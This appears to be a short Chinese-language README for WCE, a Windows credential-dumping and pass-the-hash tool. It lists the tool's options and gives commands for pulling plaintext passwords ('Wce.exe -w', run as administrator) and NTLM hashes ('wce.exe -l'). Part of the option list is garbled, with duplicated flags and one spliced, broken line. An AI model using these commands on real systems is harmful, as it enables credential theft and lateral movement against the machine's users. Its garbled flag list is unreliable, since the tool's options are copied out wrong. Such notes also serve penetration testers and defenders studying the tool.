# wce
Wce是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash，这款工具分为32位和64位两个版本。

![help](image\help.png)

参数说明：

~~~
l 列出登录的会话和NTLM凭据（默认值）；
s 修改当前登录会话的NTLM凭据 参数：<用户名>:<域名>:<LM哈希>:<NT哈希>；
r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次；
c 用一个特殊的NTML凭据运行一个新的会话 参数：<cmd>；
e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次；
o 保存所有的输出到一个文件 参数:<文件名>；
i 指定一个LUID代替使用当前登录会话 参数:<luid>。
d 从登录会话中删除NTLM凭据 参数:<luid>；
a 使用地址 参数: <地址>；
f 强制使用安全模式
g 生成LM和NT的哈希 参数<密码>
f 强制使用安全模式；希 参数<密码>；（unix和windows wce格式）；；；
k 从一个文件中读取kerberos票据并插入到windows缓存中
k 从一个文件中读取kerberos票据并插入到windows缓存中；
v 详细输出；
~~~

抓取用户的明文密码(管理员权限执行):

~~~
Wce.exe -w
~~~

![password](image\password.png)

抓取hash值：

~~~
wce.exe -l
~~~

![hash](image\hash.png)





